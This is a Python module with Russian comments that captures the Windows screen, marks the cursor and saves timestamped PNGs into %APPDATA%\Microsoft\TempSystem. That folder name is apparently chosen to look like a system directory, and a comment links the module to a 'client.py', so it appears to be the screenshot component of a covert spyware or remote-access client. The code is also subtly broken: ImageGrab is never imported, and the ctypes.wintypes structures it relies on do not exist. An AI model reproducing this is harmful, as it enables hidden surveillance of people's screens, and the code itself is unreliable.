import logging
import time
import os
from PIL import Image, ImageDraw
import ctypes
import ctypes.wintypes

logger = logging.getLogger(__name__)

# Константа для временной папки (должна совпадать с client.py)
TEMP_SYSTEM_FOLDER = os.path.join(os.getenv('APPDATA'), "Microsoft", "TempSystem")

def take_screenshot():
    try:
        # Создание временной папки, если не существует
        os.makedirs(TEMP_SYSTEM_FOLDER, exist_ok=True)
        
        # Захват скриншота
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(TEMP_SYSTEM_FOLDER, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        
        # Получение позиции и иконки курсора через WinAPI
        user32 = ctypes.WinDLL('user32')
        gdi32 = ctypes.WinDLL('gdi32')
        
        # Получение текущей позиции курсора
        cursor_info = ctypes.wintypes.CURSORINFO()
        cursor_info.cbSize = ctypes.sizeof(cursor_info)
        user32.GetCursorInfo(ctypes.byref(cursor_info))
        
        if cursor_info.flags == 1:  # CURSOR_SHOWING
            # Получение иконки курсора
            icon_info = ctypes.wintypes.ICONINFO()
            user32.GetIconInfo(cursor_info.hCursor, ctypes.byref(icon_info))
            
            # Создание объекта для рисования
            draw = ImageDraw.Draw(screenshot)
            
            # Получение позиции курсора
            x, y = cursor_info.ptScreenPos.x, cursor_info.ptScreenPos.y
            
            # Учет горячей точки курсора
            hotspot_x, hotspot_y = icon_info.xHotspot, icon_info.yHotspot
            
            # Загрузка иконки курсора (примерно, так как точное извлечение иконки сложнее)
            # Для упрощения рисуем простой прямоугольник или крестик в позиции курсора
            draw.rectangle(
                (x - hotspot_x, y - hotspot_y, x - hotspot_x + 16, y - hotspot_y + 16),
                fill=(255, 0, 0, 128)  # Полупрозрачный красный прямоугольник для видимости
            )
            
            # Освобождение ресурсов
            if icon_info.hbmMask:
                gdi32.DeleteObject(icon_info.hbmMask)
            if icon_info.hbmColor:
                gdi32.DeleteObject(icon_info.hbmColor)
        
        # Сохранение скриншота
        screenshot.save(filename)
        logger.info(f"📸 Скриншот сохранен: {filename}")
        return filename
    except Exception as e:
        logger.error(f"❌ Ошибка создания скриншота: {e}")
        return None
